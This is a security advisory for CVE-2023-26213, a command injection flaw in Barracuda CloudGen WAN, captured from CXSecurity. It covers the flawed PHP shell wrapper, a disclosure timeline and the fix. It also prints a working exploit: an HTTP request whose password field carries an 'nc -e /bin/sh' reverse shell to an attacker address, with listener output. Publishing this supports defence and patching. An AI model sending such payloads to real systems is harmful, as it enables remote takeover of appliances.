---
title: Barracuda CloudGen WAN OS Command Injection
url: https://cxsecurity.com/issue/WLB-2023030015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-07
fetch_date: 2025-10-04T08:47:43.682272
---

# Barracuda CloudGen WAN OS Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Barracuda CloudGen WAN OS Command Injection** **2023.03.06**  Credit:  **[Stefan Viehbock](https://cxsecurity.com/author/Stefan%2BViehbock/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-26213](https://cxsecurity.com/cveshow/CVE-2023-26213/ "Click to see CVE-2023-26213")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

SEC Consult Vulnerability Lab Security Advisory < 20230228-0 >
=======================================================================
title: OS Command Injection
product: Barracuda CloudGen WAN
vulnerable version: < v8.\* hotfix 1089
fixed version: v8.\* with hotfix webui-sdwan-1089-8.3.1-174141891 or above
version 9.0.0 or above
CVE number: CVE-2023-26213
impact: High
homepage: https://www.barracuda.com/products/network-security/cloudgen-wan
found: 2023-01-12
by: Stefan Viehböck (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"CloudGen WAN is more than just another SD-WAN solution. It lets you build
an automated cloud-based network by leveraging the Microsoft Global Network.
The product of a joint development program by Microsoft and Barracuda,
CloudGen WAN is the only global secure SD-WAN service built natively on Azure.
It is a single, unified solution that makes it very simple to ensure highly
secure, seamless connectivity to all your locations and all your cloud-based
resources and applications."
Source: https://www.barracuda.com/products/network-security/cloudgen-wan
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.
Vulnerability overview/description:
-----------------------------------
1) Authenticated OS Command Injection (CVE-2023-26213)
Barracuda CloudGen WAN provides a private edge appliance for hybrid deployments.
An authenticated user in the administration interface for the private edge
virtual appliance can inject arbitrary OS commands via the
/ajax/update\_certificate endpoint.
Proof of concept:
-----------------
1) Authenticated OS Command Injection (CVE-2023-26213)
The affected PHP application running on the appliance implements a custom
wrapper for securely executing OS commands. The wrapper is inspired by SQL
prepared statements and uses placeholders.
Unfortunately an attacker can inject new placeholder strings within arguments.
In the case where two or more arguments are controlled by the user, this allows
an attacker to craft a placeholder which executes arbitrary commands.
Example of a vulnerable call:
```php
// Extract the cert with the password
$extract\_cert\_status = BN\_Shell::exec(
"openssl pkcs12 -in :tmp\_cert -out :dst -clcerts -nokeys -passin pass::password",
array(
'tmp\_cert' => $cert\_folder . $name . '.base64',
'dst' => $cert\_folder . $name,
'password' => $password
)
);
```
Excerpt from BN\_Shell::exec():
```php
// Execute a full command.
// If you need to escape arguments, replace them with bind params, similar to sql binds.
// Example: exec('ls /tmp/')
// Example: exec('cp :source :dest', array('source' => '/src/dir/', 'dest' => '/dest/dir'))
public static function exec($command, array $params = array()) {
// escape and replace binds with values
foreach($params as $param => $value) {
$value = static::escape($value); // --- SEC Consult: this internally calls escapeshellargs() on the argument
$command = str\_replace(":$param", $value, $command);
}
static::$\_last\_command = $command;
$return = array();
// use proc\_open to get stdout and stderr
$descriptorspec = array(
0 => array("pipe", "r"), // stdin is a pipe that the child will read from
1 => array("pipe", "w"), // stdout is a pipe that the child will write to
2 => array("pipe", "w") // stderr is a file to write to
);
```
The following HTTP request exploits the issue.
The "name" argument contains the placeholder string ":password". At runtime,
this is replaced by the argument "password", which in this case executes a
reverse shell.
POST /ajax/update\_certificate HTTP/1.1
Host: host
Cookie: session\_id=jk7dai0pv2vr9npoarfqnuajll
X-Csrf-Token: 2da43562a3e1552259dea8dde327cd97c5176fdd
Content-Type: application/json;charset=utf-8
Content-Length: 999
{"pem":{"certificate":{},"key":{}},"pems":{"certificate":{},"key":{}},"pkcs12":{"certificate":{"content":"XXXXXXXXXXXXXXXX","name":"keyStoreAAA :password.pfx"},"key":{},"password":"; nc -e /bin/sh
192.168.200.1 4242 # XXX"},"currentType":"pkcs12"}
$ nc -l -p 4242
id
uid=48(www-data) gid=48(www-data) groups=48(www-data)
Vulnerable / tested versions:
-----------------------------
The issue was found in Barracuda CloudGen WAN (private edge appliance) version
8.3.1 (GWAY-8.3.1-0086-VTxxx.ova).
Vendor contact timeline:
------------------------
2023-01-12: Contacting vendor through bugcrowd submission.
2023-01-12: Auto-response from bugcrowd, submission set to "not applicable".
2023-01-13: Response from vendor, set to "triaged".
2023-01-24: Vendor provides a patch/diff.
2023-02-14: Vendor informs us that patch/hotfix 1089 has been released on 26th
January as automatic patch for CGW sites and gateways. It targets
version 8 and will be included in the future version 9. Vendor
sets submission to "resolved"
2023-02-14: Asking whether it is applicable to bug bounty and for CVE number.
No response.
2023-02-20: Informing vendor that we are going to request a CVE number and will
publish the advisory afterwards.
2023-02-20: Vendor response: no CVE was assigned yet, provides link to security
note.
2023-02-28: Release of security advisory.
Solution:
---------
There is an updated version 8 with hotfix 1089 available, future version 9 also
incorporates the fix.
Barracuda customers should check the SDWAN WebUI or the cloud-based Applia...